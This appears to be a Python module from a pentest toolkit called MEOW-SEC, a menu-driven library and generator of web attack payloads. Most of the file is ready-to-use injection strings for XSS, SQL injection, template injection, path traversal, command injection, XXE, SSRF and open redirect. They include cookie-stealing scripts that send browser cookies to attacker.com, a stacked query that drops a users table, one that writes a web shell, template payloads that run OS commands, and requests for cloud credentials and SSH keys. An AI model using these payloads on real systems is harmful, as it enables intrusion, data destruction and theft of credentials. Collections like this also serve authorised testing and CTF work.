# -*- coding: utf-8 -*-
"""
MEOW-SEC :: PAYLOAD — Payload Library & Generator
  Bibliothèque de payloads pour tests de sécurité autorisés (CTF, pentest)
  · XSS · SQLi · SSTI · LFI/Path traversal · Command injection
  · XXE · Open redirect · SSRF · Headers injection
  · Fuzzing wordlists · Custom payload generator
"""
import os, json, re
from datetime import datetime

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.syntax import Syntax
from rich import box

# ═══════════════════════════════════════════════════════════════
#  PAYLOAD DATABASES
# ═══════════════════════════════════════════════════════════════

PAYLOADS = {

"xss": {
    "desc": "Cross-Site Scripting (XSS)",
    "categories": {
        "Basic": [
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>confirm(1)</script>",
            "<script>prompt(1)</script>",
        ],
        "Event handlers": [
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror='alert(document.domain)'>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<marquee onstart=alert(1)>",
        ],
        "Attribute breakout": [
            "'\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "\" autofocus onfocus=alert(1) \"",
            "') ; alert(1); //",
        ],
        "Filter bypass": [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<script >alert(1)</script >",
            "<%2fscript><script>alert(1)",
            "<svg/onload=alert(1)>",
            "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
            "\"><svg onload=eval(atob('YWxlcnQoMSk='))>",
        ],
        "DOM / JS URIs": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "<a href=javascript:alert(1)>click</a>",
            "<iframe src=javascript:alert(1)>",
        ],
        "Cookie stealing": [
            "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
            "<img src=x onerror=\"this.src='https://attacker.com/?c='+document.cookie\">",
            "<script>new Image().src='https://attacker.com/?c='+encodeURIComponent(document.cookie)</script>",
        ],
    }
},

"sqli": {
    "desc": "SQL Injection",
    "categories": {
        "Authentication bypass": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR 1=1--",
            "admin'--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "1' OR '1'='1' /*",
            "\" OR \"\"=\"",
        ],
        "Error-based": [
            "'",
            "''",
            "' OR 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
        "UNION based": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT username,password FROM users--",
        ],
        "Time-based blind": [
            "1' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1' AND pg_sleep(5)--",
            "1'; SELECT SLEEP(5)--",
            "1' AND IF(1=1,SLEEP(5),0)--",
        ],
        "Boolean blind": [
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND substring(username,1,1)='a'--",
            "1' AND (SELECT COUNT(*) FROM users)>0--",
        ],
        "Stacked queries": [
            "1'; DROP TABLE users--",
            "1'; INSERT INTO users(username,password) VALUES('hack','hack')--",
            "1'; EXEC xp_cmdshell('whoami')--",
        ],
        "Out-of-band": [
            "' UNION SELECT LOAD_FILE('/etc/passwd')--",
            "' INTO OUTFILE '/var/www/html/shell.php'--",
        ],
    }
},

"ssti": {
    "desc": "Server-Side Template Injection (SSTI)",
    "categories": {
        "Detection": [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{7*'7'}}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "{{'a'.toUpperCase()}}",
            "{{config}}",
        ],
        "Jinja2 (Python/Flask)": [
            "{{config.items()}}",
            "{{self.__dict__}}",
            "{{request.environ}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{''.class.mro()[1].subclasses()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "Twig (PHP)": [
            "{{7*7}}",
            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
            "{{['id']|filter('system')}}",
        ],
        "FreeMarker (Java)": [
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"id\")}",
        ],
        "Mako (Python)": [
            "${__import__('os').popen('id').read()}",
        ],
        "ERB (Ruby)": [
            "<%= 7*7 %>",
            "<%= `id` %>",
            "<%= system('id') %>",
        ],
    }
},

"lfi": {
    "desc": "Local File Inclusion / Path Traversal",
    "categories": {
        "Linux targets": [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../etc/shadow",
            "../../../etc/hosts",
            "../../../etc/hostname",
            "../../../proc/version",
            "../../../proc/self/environ",
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log",
            "../../../var/www/html/.env",
            "../../../home/user/.ssh/id_rsa",
        ],
        "Windows targets": [
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\win.ini",
            "C:\\boot.ini",
            "C:\\Users\\Administrator\\Desktop\\flag.txt",
            "..\\..\\..\\Users\\Administrator\\Desktop\\flag.txt",
        ],
        "Null byte / encoding bypass": [
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.php",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....\\....\\....\\windows\\win.ini",
        ],
        "PHP wrappers": [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
            "expect://id",
        ],
    }
},

"cmdi": {
    "desc": "Command Injection",
    "categories": {
        "Linux separators": [
            "; id",
            "| id",
            "|| id",
            "&& id",
            "& id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| whoami",
            "; ls -la",
            "\n id",
            "0x0a id",
        ],
        "Windows separators": [
            "& whoami",
            "| whoami",
            "|| whoami",
            "&& whoami",
            "; whoami",
            "` whoami`",
        ],
        "Blind detection": [
            "; ping -c 1 attacker.com",
            "| ping -n 1 attacker.com",
            "; sleep 5",
            "| timeout 5",
            "; curl attacker.com",
        ],
        "Filter bypass": [
            "c'a't /etc/passwd",
            'c"a"t /etc/passwd',
            "cat$IFS/etc/passwd",
            "cat${IFS}/etc/passwd",
            "c\at /etc/passwd",
            "/???/??t /e??/p??????",
            "w'h'o'am'i",
        ],
    }
},

"xxe": {
    "desc": "XML External Entity (XXE)",
    "categories": {
        "Basic": [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        ],
        "SSRF via XXE": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>',
        ],
        "Blind OOB": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>',
        ],
    }
},

"ssrf": {
    "desc": "Server-Side Request Forgery (SSRF)",
    "categories": {
        "Internal network": [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://192.168.0.1/",
            "http://10.0.0.1/",
        ],
        "Cloud metadata": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
        ],
        "Bypass": [
            "http://0x7f000001/",
            "http://2130706433/",
            "http://127.1/",
            "http://127.0.1/",
            "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        ],
    }
},

"open_redirect": {
    "desc": "Open Redirect",
    "categories": {
        "Basic": [
            "//evil.com",
            "/\\evil.com",
            "https://evil.com",
            "//evil.com/%2F..",
            "////evil.com",
            "///evil.com",
        ],
        "Parameter injection": [
            "?url=https://evil.com",
            "?next=https://evil.com",
            "?redirect=https://evil.com",
            "?return=https://evil.com",
            "?dest=https://evil.com",
            "?goto=https://evil.com",
        ],
    }
},

}

# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════

def run():
    show_module_banner("payload")
    warn("Use only on systems you own or have explicit permission to test.")
    console.print()

    while True:
        _show_main_menu()
        choice = ask_choice("PAYLOAD", "0")
        if choice == "0": break

        cat_map = {
            "1": "xss",   "2": "sqli", "3": "ssti",
            "4": "lfi",   "5": "cmdi", "6": "xxe",
            "7": "ssrf",  "8": "open_redirect",
            "9": None,    # search
        }
        key = cat_map.get(choice)
        if key:
            _show_category(key)
        elif choice == "9":
            _search()
        elif choice == "10":
            _custom_gen()
        console.print()

def _show_main_menu():
    t = Table(show_header=False, box=box.SIMPLE, padding=(0,2), show_edge=False)
    t.add_column("k", style=CY, width=5)
    t.add_column("→", style=G2, width=2)
    t.add_column("name", style=f"bold {G1}", width=20)
    t.add_column("desc", style=DM)

    entries = [
        ("1",  "XSS",           "Cross-Site Scripting payloads"),
        ("2",  "SQLI",          "SQL Injection payloads"),
        ("3",  "SSTI",          "Template Injection payloads"),
        ("4",  "LFI/PATH",      "Local File Inclusion & path traversal"),
        ("5",  "CMD INJECTION", "OS command injection"),
        ("6",  "XXE",           "XML External Entity payloads"),
        ("7",  "SSRF",          "Server-Side Request Forgery"),
        ("8",  "OPEN REDIRECT", "Open redirect payloads"),
        ("9",  "SEARCH",        "Search across all payloads"),
        ("10", "CUSTOM",        "Generate custom payload from template"),
        ("0",  "BACK",          ""),
    ]
    for k, name, desc in entries:
        t.add_row(f"[{CY}][{k}][/]", "►", name, desc)
    console.print(Panel(t, title=f"[{G1}]◈ PAYLOAD LIBRARY ◈",
                        border_style=G2, padding=(1,2)))

def _show_category(key: str):
    if key not in PAYLOADS:
        err(f"Unknown category: {key}"); return

    cat = PAYLOADS[key]
    info(f"Category: [{CY}]{cat['desc']}[/]")
    console.print()

    # Sous-catégories
    categories = cat["categories"]
    cats_list = list(categories.keys())
    for i, name in enumerate(cats_list, 1):
        console.print(f"  [{G1}][{i}][/] {name}  [{DM}]({len(categories[name])} payloads)[/]")
    console.print(f"  [{G1}][A][/] All categories")
    console.print()

    choice = Prompt.ask(f"  [{G1}]◈ Select[/]", default="A").upper()

    if choice == "A":
        for name, payloads in categories.items():
            _display_payloads(name, payloads)
    else:
        try:
            idx = int(choice) - 1
            name = cats_list[idx]
            _display_payloads(name, categories[name])
        except (ValueError, IndexError):
            err("Invalid choice")

def _display_payloads(category: str, payloads: list):
    from rich.rule import Rule
    console.print(Rule(f"[{G1}] {category} ", style=G2))

    t = Table(box=box.SIMPLE, border_style=G2, header_style=CY, show_edge=False,
              show_header=False)
    t.add_column("#", style=DM, width=4)
    t.add_column("Payload", style=G1)

    for i, p in enumerate(payloads, 1):
        t.add_row(str(i), p)
    console.print(t)

    # Export option
    if Confirm.ask(f"  [{G1}]◈ Export this category?[/]", default=False):
        _export_payloads(category, payloads)

def _search():
    query = Prompt.ask(f"  [{G1}]◈ Search term[/]").strip().lower()
    if not query: return

    results = []
    for cat_key, cat_data in PAYLOADS.items():
        for subcat, payloads in cat_data["categories"].items():
            for p in payloads:
                if query in p.lower():
                    results.append((cat_key.upper(), subcat, p))

    if results:
        find(f"{len(results)} payloads matching '{query}'")
        t = Table(box=box.SIMPLE, border_style=G2, header_style=CY)
        t.add_column("Category", style=CY, width=12)
        t.add_column("Subcategory", style=OR, width=18)
        t.add_column("Payload", style=G1)
        for cat, sub, p in results:
            t.add_row(cat, sub, p)
        console.print(t)
    else:
        warn(f"No payloads found for '{query}'")

def _custom_gen():
    from rich.rule import Rule
    console.print(Rule(f"[{G1}] CUSTOM PAYLOAD ", style=G2))
    console.print(f"  [{DM}]Use {{TARGET}}, {{ATTACKER}}, {{CMD}}, {{FILE}}, {{PARAM}} as placeholders[/]")
    console.print()

    template = Prompt.ask(f"  [{G1}]◈ Template[/]").strip()
    if not template: return

    vals = {}
    for placeholder in re.findall(r"\{(\w+)\}", template):
        vals[placeholder] = Prompt.ask(f"  [{G1}]◈ Value for {placeholder}[/]").strip()

    result = template
    for k, v in vals.items():
        result = result.replace(f"{{{k}}}", v)

    console.print(Panel(Text(result, style=f"bold {G1}"),
                        title=f"[{G1}]Custom Payload", border_style=G2))

def _export_payloads(category: str, payloads: list):
    out_dir = os.path.join(os.path.dirname(__file__), "..", "data")
    os.makedirs(out_dir, exist_ok=True)
    slug = re.sub(r"[^a-z0-9]", "_", category.lower())
    fname = os.path.join(out_dir, f"payloads_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    with open(fname, "w", encoding="utf-8") as f:
        f.write(f"# MEOW-SEC PAYLOAD — {category}\n")
        f.write(f"# Generated: {datetime.now()}\n\n")
        for p in payloads:
            f.write(p + "\n")
    ok(f"Exported [{G1}]{len(payloads)}[/] payloads → [{CY}]{os.path.basename(fname)}[/]")

def _banner():
    logo = Text(r"""
 ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗
 ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
 ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
 ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
 ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
 ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝
  [XSS · SQLI · SSTI · LFI · CMDI · XXE · SSRF]""", style=f"bold {G1}")
    console.print(Panel(Align(logo, align="center"), border_style=RD, padding=(0,1)))
